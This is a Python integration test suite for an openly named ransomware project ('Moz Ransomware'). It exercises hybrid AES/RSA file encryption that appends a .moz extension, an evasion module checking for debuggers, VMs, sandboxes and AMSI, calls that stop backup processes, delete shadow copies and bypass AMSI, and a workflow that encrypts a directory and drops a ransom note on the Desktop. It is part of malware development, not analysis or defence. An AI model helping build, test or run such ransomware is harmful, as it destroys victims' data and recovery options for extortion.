"""
Moz Ransomware - Phase 4 Integration Test Suite
Tests the full crypto + evasion workflow with Python wrapper.
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path

# Add wrapper path to imports (same directory as moz_wrapper.py)
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from moz_wrapper import MozRansomware, MozEvasion, MozCrypto


def test_crypto_bridge():
    """Test C API bridge (Python fallback on non-Windows)."""
    print("=" * 60)
    print("PHASE 4 TEST: Crypto + Evasion Integration")
    print("=" * 60)
    print()
    
    # Test 1: Crypto hybrid encryption/decryption
    print("[TEST 1] Hybrid Encryption Round-Trip")
    moz = MozRansomware()
    
    test_data = b"Test data for hybrid AES-256-GCM + RSA-2048 encryption"
    print(f"  Original data: {len(test_data)} bytes")
    
    blob = moz.crypto.hybrid_encrypt(test_data)
    print(f"  Blob created:")
    print(f"    - AES key: {len(blob.aes_key)} bytes (RSA-wrapped)")
    print(f"    - IV: {len(blob.iv)} bytes")
    print(f"    - Auth tag: {len(blob.tag)} bytes")
    print(f"    - Ciphertext: {len(blob.ciphertext)} bytes")
    
    decrypted = moz.crypto.hybrid_decrypt(blob)
    assert decrypted == test_data, "Decryption mismatch!"
    print("  ✓ Round-trip successful")
    print()
    
    # Test 2: File encryption/decryption
    print("[TEST 2] File Encryption/Decryption")
    with tempfile.TemporaryDirectory() as tmpdir:
        test_file = os.path.join(tmpdir, "test.txt")
        encrypted_file = test_file + ".moz"
        
        # Create test file
        with open(test_file, 'w') as f:
            f.write("This is a test file for encryption.")
        
        print(f"  Original file: {test_file}")
        with open(test_file, 'rb') as f:
            original_content = f.read()
        print(f"  Content: {len(original_content)} bytes")
        
        # Encrypt
        result = moz.crypto.encrypt_file(test_file, encrypted_file)
        assert result, "File encryption failed!"
        print("  ✓ File encrypted successfully")
        
        # Verify .moz file exists and has content
        assert os.path.exists(encrypted_file), ".moz file not created"
        with open(encrypted_file, 'rb') as f:
            encrypted_content = f.read()
        print(f"  Encrypted file: {len(encrypted_content)} bytes")
        
        # Decrypt
        decrypted_file = test_file[:-4]
        result = moz.crypto.decrypt_file(encrypted_file, decrypted_file)
        assert result, "File decryption failed!"
        print("  ✓ File decrypted successfully")
        
        # Verify content matches
        with open(decrypted_file, 'rb') as f:
            decrypted_content = f.read()
        assert decrypted_content == original_content, "Decryption content mismatch!"
        print("  ✓ Content verified")
    
    print()
    
    # Test 3: Evasion module
    print("[TEST 3] Evasion Module")
    evasion = MozEvasion()
    summary = evasion.get_summary()
    
    print(f"  - Native library loaded: {summary['native_lib_loaded']}")
    print(f"  - Debugger present: {summary['debugger_present']}")
    print(f"  - Virtual machine: {summary['virtual_machine']}")
    print(f"  - Sandbox detected: {summary['sandbox']}")
    print(f"  - AMSI active: {summary['amsi_active']}")
    
    # Test bypass calls (no-op on non-Windows)
    evasion.stop_backup_processes()
    evasion.delete_shadow_copies()
    evasion.bypass_amsi()
    print("  ✓ Evasion functions executed")
    print()
    
    # Test 4: Full workflow
    print("[TEST 4] Full Workflow (encrypt + ransom note)")
    with tempfile.TemporaryDirectory() as tmpdir:
        # Create test files
        test_dir = os.path.join(tmpdir, "test_dir")
        os.makedirs(test_dir)
        
        test_files = [
            "document.txt",
            "data.csv", 
            "image.jpg"
        ]
        
        for filename in test_files:
            filepath = os.path.join(test_dir, filename)
            with open(filepath, 'w') as f:
                f.write(f"Test content for {filename}")
        
        print(f"  Created test files in: {test_dir}")
        
        # Run encryption
        results = moz.encrypt_directory(tmpdir)
        
        print(f"\n  Encryption Results:")
        print(f"    - Total scanned: {results['total_files']}")
        print(f"    - Encrypted: {results['encrypted_files']}")
        print(f"    - Skipped: {results['skipped_files']}")
        
        assert results['encrypted_files'] == 3, "Expected 3 files encrypted"
        print("  ✓ All test files encrypted")
        
        # Verify ransom note created
        desktop_path = Path.home() / "Desktop"
        if not desktop_path.exists():
            desktop_path.mkdir(parents=True, exist_ok=True)
        
        note_path = desktop_path / f"!!!READ_ME!!!.txt"
        assert os.path.exists(note_path), "Ransom note not created!"
        
        with open(note_path, 'r') as f:
            note_content = f.read()
        
        print(f"\n  Ransom note saved to: {note_path}")
        print(f"  ✓ Ransom note generated")
    
    print()
    print("=" * 60)
    print("ALL PHASE 4 TESTS PASSED")
    print("=" * 60)


if __name__ == "__main__":
    test_crypto_bridge()
